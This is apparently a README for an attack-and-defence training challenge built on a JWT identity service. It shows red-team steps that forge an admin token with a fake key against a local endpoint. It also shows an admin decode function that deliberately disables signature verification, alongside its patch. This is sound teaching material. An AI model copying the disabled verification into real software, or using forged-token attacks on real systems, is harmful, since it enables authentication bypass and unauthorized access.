# JWT Identity Portal - Hack & Shield A&D Challenge

## Service Description
The **Internal Auth API** is a simulated corporate Single Sign-On (SSO) dashboard. It allows employees to generate standard JSON Web Tokens (JWT) to access internal endpoints. 

**The Vulnerability:** The service suffers from a **JWT Unverified Signature** vulnerability. While the public token inspector (`/api/verify`) strictly verifies the cryptographic signature, the critical administrator endpoint (`/api/admin/flag`) relies on a flawed decoding function that explicitly disables signature verification. This allows attackers to forge elevated claims without knowing the server's secret key.

## What to Expect (Service Flow)
When the service is running, it exposes the following key endpoints:
* `GET /api/token` - Issues a valid JWT with the claim `"role": "employee"`.
* `GET /api/verify` - A debugging endpoint that strictly validates a token and displays its decoded payload.
* `GET /api/admin/flag` - The target endpoint. It reads the JWT from the `Authorization: Bearer <token>` header, checks if `"role": "admin"`, and returns the flag.
* `GET /api/admin/` - A web UI equivalent of the flag endpoint.

## Local Setup & Deployment
Run these commands from the project root to start the target server:

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
python app.py
```
*The service will start listening on `http://127.0.0.1:5001`.*

---

## Attack Phase (Red Team)
Your goal as an attacker is to retrieve the flag by tricking the server into believing you are an administrator.

### Step 1: Reconnaissance
Fetch a standard employee token to understand the payload structure:
```bash
curl -s [http://127.0.0.1:5001/api/token](http://127.0.0.1:5001/api/token)
```
You will receive a token where the payload decodes to `{"sub": "employee_01", "role": "employee", "iss": "Internal Auth API"}`.

### Step 2: Forge the Token
Because the admin endpoint fails to verify the cryptographic signature, you can forge a new token with the `admin` role and sign it with a completely arbitrary, fake secret key. 

Generate the malicious token using Python:
```bash
FORGED_TOKEN=$(python3 -c 'import jwt; print(jwt.encode({"sub":"hacker","role":"admin"}, "fake_key_123", algorithm="HS256"))')
```

*(Alternatively, copy the employee token into jwt.io, change `"role": "employee"` to `"role": "admin"`, and copy the resulting string. The signature does not matter).*

### Step 3: Capture the Flag
Send the forged token to the protected admin API to steal the flag:
```bash
curl -s -H "Authorization: Bearer $FORGED_TOKEN" [http://127.0.0.1:5001/api/admin/flag](http://127.0.0.1:5001/api/admin/flag)
```
**Expected Output:** `{"flag":"HNS{jwt_unverified_signature_demo}","message":"Administrator authenticated"}`

---

## Defense Phase (Blue Team)
Your goal as a defender is to patch the vulnerability in the source code so attackers can no longer forge tokens, while ensuring legitimate employee tokens continue to work.

### Step 1: Locate the Vulnerability
Open `app.py` and inspect the `decode_admin_token(token)` function. You will see that `options={"verify_signature": False}` is explicitly passed to the decoding library, telling it to ignore the cryptography.

### Step 2: Apply the Patch
Remove the insecure option. Change the function to enforce standard signature verification.

**Vulnerable Code:**
```python
def decode_admin_token(token):
    return jwt.decode(
        token,
        JWT_SECRET,
        algorithms=["HS256"],
        options={"verify_signature": False}
    )
```

**Patched Code:**
```python
def decode_admin_token(token):
    return jwt.decode(
        token,
        JWT_SECRET,
        algorithms=["HS256"]
    )
```

### Step 3: Verify the Fix
Restart the Flask server.
1. **Check the Exploit:** Re-run the attacker `curl` command with the `$FORGED_TOKEN`. It should now fail with `{"error": "Invalid token"}`.
2. **Check the SLA (Service Level Agreement):** Fetch a brand new token from `/api/token` and ensure the web portal still loads properly. If legitimate employees can still use the service, your patch is successful.